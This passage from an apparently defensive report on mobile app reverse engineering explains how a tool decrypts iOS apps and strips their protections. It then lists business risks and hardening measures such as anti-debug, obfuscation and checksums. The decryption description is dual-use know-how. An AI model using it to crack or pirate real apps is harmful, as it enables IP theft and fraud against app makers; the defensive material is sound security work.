### Technical Explanation

Typically, adversaries use tools like <i>clutchmod</i> to decrypt an
application and store it to disk. This tool starts the application and
attaches a debugger to it while it is running. At this point, iOS has
decrypted the application and is executing it in memory. After iOS has
loaded the application, the tool captures the decrypted memory image and
repackages it into an unencrypted <i>IPA</i> file.

<i>Clutchmod</i> modifies the image’s
<i>LC_ENCRYPTION_INFO.cryptid</i> field and sets this value to
<i>0</i>. This indicates to iOS that the application no longer requires
decryption upon startup. Furthremore, <i>clutchmod</i> removes the
image’s <i>SC_Info</i> folder. This folder contains signature
information used by the iOS to enforce code-signing.

Once the adversary has successfully gathered the unecrypted form of the
application, they proceed to subsequent steps of static analysis and
modification.

### Technical Recommendations

To mitigate the risks that an adversary will successfully attach a
debugger to the application’s running process, consider doing the
following:

  - Insert defensive code into the app that can detect if the
    application’s signature has been removed. The inserted code should
    check for the presence of the <i>SC_Info</i> folder. If the folder
    does not exist, this is a strong indicator that the application has
    been successfully decrypted. The application should respond
    appropriately by failing in subtle and unpredictable ways; and

<!-- end list -->

  - Invoke additional code within the application that will detect the
    presence of debuggers. Invocation of said code should occur just
    before sensitive code is executed or assets are decrypted in memory.
    There are a diverse number of techniques appropriate for the
    detection of debuggers.

# Business Risks

In today’s business environment, organizations face an ever-increasing
number of different business risks that must be intelligently acted
upon. This section of the report focuses on key business risks that
organizations must consider for applications that store, transmit, or
process sensitive information assets in an untrustworthy environment.
Risks highlighted in red in the following graph are discussed in greater
detail within this section:

<center>

![<File:RiskTree-Business.png>](RiskTree-Business.png
"File:RiskTree-Business.png")

</center>

The primary audience of this section is a business audience interested
in understanding the business impacts of unauthorized reverse
engineering or code modification.

## Five Strategic Recommendations for Mitigating Reverse Engineering / Code Modification Business Risks

To mitigate each of the business risks outlined in this section of the
report, consider doing the following:

  - Educate stakeholders about how mobile application security risks and
    practices need to go beyond avoiding programming flaws (“building it
    secure”) to proactively ensuring protection in the wild against
    hacking attacks (“keeping it secure”);

<!-- end list -->

  - Assess the value at stake in mobile applications (e.g., brand,
    trust, IP, revenue, data);

<!-- end list -->

  - Assess technical risks in mobile applications to identify attack
    targets and binary-level attack vectors with reverse-engineering,
    code analysis, code modification and injection;

<!-- end list -->

  - Develop a plan to protect mobile applications against these attacks
    prior to releasing / deploying them “into the wild”; and

<!-- end list -->

  - Consider using best-of-breed protection tools that enable injection
    of self-defense and tamper-resistance mechanisms in the application.

## Brand and Trust Damage

### Description

For many companies, their success is predicated on customer trust in the
products and services. Even the mere existence of hacked, cracked, or
infested versions of mobile applications or public knowledge of
successful attacks can damage the brand of the application provider and
deteriorate customers’ trust.

### Dependent Technical Risks

To realize this business risk, an adversary must realize any of the
other business risks outlined in this document. Historically, the media
have tended to report on incidents that relate to the following business
risks:

  - Intellectual Property Theft;

<!-- end list -->

  - Privacy Related Data Theft;

<!-- end list -->

  - Revenue Loss and Piracy; and

<!-- end list -->

  - Unauthorized Access and Fraud

## User Experience Compromise

### Description

Often, an adversary will modify an application’s business logic to allow
the user to do something they would otherwise be unable to do. For
instance, within the world of multi-player gaming, classic examples
include unauthorized patches that give a game player infinite health.
Such unauthorized changes compromise the user experience and also lead
to damage of the organization’s brand.

### Dependent Technical Risks

To realize this business risk, an adversary must realize any of the
following technical risks:

  - Automated Jailbreak-Detection Breaking;

<!-- end list -->

  - Root Detection Modification; or

<!-- end list -->

  - Security Control Bypass.

## Intellectual Property Theft

### Description

Intellectual property (IP) theft is a big concern for organizations that
have developed valuable proprietary software IP (e.g., unique
algorithms) that are included in mobile applications. For instance,
current or potential competitors can decompile and analyze the source
code and lift the relevant IP for their purposes. This is especially
concerning when the applications are accessible in regions (e.g., China
and various emerging countries) that are not effectively enforcing IP
rights. IP theft is also possible even on the server-side if the server
code is hosted in an environment where adversaries may access the server
and move the code to a different location where it can be
reverse-engineered.

### Dependent Technical Risks

To realize this business risk, an adversary must realize any of the
following technical risks:

  - Algorithm Analysis;

<!-- end list -->

  - Exposed Data Symbols;

<!-- end list -->

  - Exposed Method Signatures; or

<!-- end list -->

  - Application Decryption.

## Privacy-Related Data Theft

### Description

An application that stores, transmits, or processes personally
identifiable information (PII) is at risk of modification by an
adversary. Typically, adversaries will modify the application and force
it to transmit such privacy-related data to a site hosted by the
adversary. An adversary may also lure a victim to download and execute
the modified apps in order to install spyware on the victim’s device.

### Dependent Technical Risks

To realize this business risk, an adversary must launch any of the
following technical threats:

  - Cryptographic Key Interception;

<!-- end list -->

  - Swizzle Without Behavioral Change;

<!-- end list -->

  - Swizzle With Behavioral Change;

<!-- end list -->

  - Modification of Presentation Layer; or

<!-- end list -->

  - Repackaging.

## Confidential Data Theft

### Description

Confidential information is defined as information that relates to the
daily functioning of an organization. The disclosure of confidential
information may result in direct damages to the organization but would
not directly affect consumers of services or products produced by the
organization. This type of theft is typically referred to as corporate
espionage.

An application that stores, transmits, or processes confidential
information can be subject to multiple types of compromises. An
adversary may bypass access and usage controls to access competitive
information. Alternatively, the adversary may choose to intercept and
steal authentication credentials, or modified applications to install
spyware for remote control/monitoring purposes.

### Dependent Technical Risks

To realize this business risk, an adversary must launch any of the
following technical threats:

  - Security Control Bypass;

<!-- end list -->

  - Modification of Presentation Layer;

<!-- end list -->

  - Swizzle with Behavioral Change; or

<!-- end list -->

  - Cryptographic Key Interception.

## Revenue Loss and Piracy

### Description

There are several ways that adversaries can compromise the revenue model
of an application provider. Adversaries can distribute free versions of
paid applications, re-publish the application under their brand, bypass
in-app purchasing requirements for restricted functionality, or perform
ad stripping for ad-free versions. Lots of studies have shown rampant
piracy and duplication of iOS and Android apps that are slightly
modified and resold within official or third-party app stores or
download sites.

In 2012, over 90% of the Top 100 Apple iOS and Top 100 Android apps were
found to be cracked and available on third-party sites (see Arxan's
State of Security in the App Economy research, 2012).

### Dependent Technical Risks

To realize this business risk, an adversary must realize any of the
following technical risks:

  - Repackaging; or

<!-- end list -->

  - Security Control Bypass.

## Business Logic Bypass

### Description

Often, an adversary will modify an application’s business logic to allow
the user to do something they would otherwise be unable to do. Within
the world of online gaming, classic examples include unauthorized
patches that give a game player infinite health. Such unauthorized
changes compromise the user experience and lead to damage of the
organization’s brand.

### Dependent Technical Risks

To realize this business risk, an adversary must realize any of the
following technical risks:

  - Automated Jailbreak-Detection Breaking;

<!-- end list -->

  - Root-Detection Modification; or

<!-- end list -->

  - Security Control Bypass.

## Repudiation

### Description

Repudiation allows a user to plausibly deny that they conducted a
particular transaction. In the event that an adversary intercepts
authentication credentials or session cookies, the adversary masquerades
as the user and performs operations on their behalf.

### Dependent Technical Risks

To realize this business risk, an adversary must realize any of the
following technical risks:

  - Presentation Layer Modification;

<!-- end list -->

  - Security Control Bypass; or

<!-- end list -->

  - Swizzle With Behavioral Change.

## Unauthorized Access and Fraud

### Description

Mobile applications that process transactions typically have security
mechanisms for access and usage control and credentials processing.
Attackers may bypass these security controls or intercept the
credentials, thus opening the possibility for unauthorized transactions
where the adversary masquerades as the user and performs operations on
their behalf.

### Dependent Technical Risks

To realize this business risk, an adversary must realize any of the
following technical risks:

  - Presentation Layer Modification;

<!-- end list -->

  - Security Control Bypass;

<!-- end list -->

  - Cryptographic Key Interception; or

<!-- end list -->

  - Swizzle with Behavioral Change.

## Financial Charging

### Description

Quite often, an adversary will insert malware into an existing mobile
application with the intention of enable financial charging. The
victim’s device may send text messages or place voice calls to premium
numbers.

### Dependent Technical Risks

To realize this business risk, an adversary must realize any of the
following technical risks:

  - Repackaging.

## Elevation of Privilege

### Description

An adversary may modify an application’s behavior to execute
administrative functions contained within the local binary or exposed
remotely via services. One of the common objectives for a malware
payload in a mobile app is to get remote access to the device or link it
to a botnet. When the user’s device joins the botnet, the adversary
recruits their device into participating in other attacks paid for by
individuals.

### Dependent Technical Risks

To realize this business risk, an adversary must launch any of the
following technical threats:

  - Security Control Bypass;

<!-- end list -->

  - Presentation Layer Modification; or

<!-- end list -->

  - Cryptographic Key Interception.

# Concluding Remarks

An organization needs to achieve the following objectives to mitigate
application integrity vulnerabilities:

  - <b>Protect</b>: An organization should apply integrity security
    controls to software that it will deploy in distributed or untrusted
    environments. This should occur prior to the release/deployment
    phase to mitigate risk of reverse-engineering, tampering, or
    exploitation of the application; and

<!-- end list -->

  - <b>Deter and discourage</b>: An organization should make violation
    efforts so time-consuming, difficult, or expensive to be impractical
    as well as unusable across releases.

To achieve these objectives, the organization must:

  - Identify integrity threats, risks, and attack vectors to define
    required protections; and

<!-- end list -->

  - Design and insert binary security controls within the software code
    (using a defense-in depth approach) that defend, detect, and react
    to attacks.

To protect the application and mitigate risks on the mobile platform
effectively, the organization needs to first identify relevant integrity
risks and attack vectors in the application. This forms the basis of the
protection strategy. Once the organization identifies vulnerable assets,
it is paramount to protect them with robust application-hardening and
tamper-protection techniques. These techniques must be able to defend,
detect, and react to reverse engineering attacks. Such techniques
include:

Defend against compromise:

  - <b>Code obfuscation</b>: Defends against reverse-engineering by
    transforming program code and their control flows to an
    unintelligible form;

<!-- end list -->

  - <b>Symbol stripping</b>: Defends against reverse-engineering by
    removing unused program symbols (which usually convey sensitive
    information to adversaries) from application binaries;

<!-- end list -->

  - <b>Symbol renaming</b>: Defends against reverse-engineering by
    changing easy-to-understand program symbol names (that cannot be
    removed from applications) to irrelevant names;

<!-- end list -->

  - <b>Encryption</b>: Encrypts parts of or the whole application when
    stored on disk and when unused at runtime. Also, encrypts data
    within the application;

<!-- end list -->

  - <b>String encryption</b>: Defends against reverse-engineering by
    hiding plaintext string encodings (e.g., sensitive text-based SQL
    queries or private messages sent to remote trusted servers) through
    encryption; and

<!-- end list -->

  - <b>Damage</b>: Replaces sensitive regions with decoy or garbage code
    when not in use and replaces with the original code when in use.

Detect attempted attacks:

  - <b>Anti-debug</b>: Defends against reverse-engineering by inserting
    into applications special logic that can detect the use of
    debuggers; upon detection of debuggers, the inserted logic can
    respond with appropriate countermeasures;

<!-- end list -->

  - <b>Checksum</b>: Defends against tampering by inserting into
    applications special logic that can detect tampering changes on code
    and data; upon detection of tampering, the inserted logic can
    respond with appropriate countermeasures;

<!-- end list -->

  - <b>Jailbreak / Root Detection</b>: Detect jailbreaking or rooting
    during run-time of application; and

<!-- end list -->

  - <b>Swizzling</b>: Defends against swizzling attacks by inserting
    into applications special logic that can detect when the adversary
    in intercepting or substituting method invocations by the
    application; upon detection of swizzling, the inserted logic can
    respond with appropriate countermeasures.

Alert and react to ward off attacks:

  - <b>Self-repair</b>: Defends against tampering by inserting into
    applications special logic that can erase attack changes made to
    critical code or data by restoring their original values at runtime;

<!-- end list -->

  - <b>Standard reactions</b>: Exit the application, fail its
    operations, or perform other custom calls/function callbacks; and

<!-- end list -->

  - <b>Alerts</b>: Alerts local or remote servers (“phone home”);
    integration with security consoles.

When applied appropriately, these self-defenses can make a mobile
application highly resilient against attacks, even on rooted or
jailbroken (compromised) devices. For example, self-checksum and
self-repair code equips your app with self-awareness, self-repair, and
tamper-response capabilities, so that it is fully capable of detecting
whether its own state has been modified, erasing the changes if
possible, and taking remedial or punitive actions against the intrusion
(e.g., reporting the attack to a remote server or stopping the
application from running).

It is important to layer these defenses and implement them in a
networked fashion such that the protection does not cover just the
vulnerable application code, but also the protection mechanisms
themselves. This is a multi-layered, defense-in-depth approach that has
been proven highly effective against hacking attempts.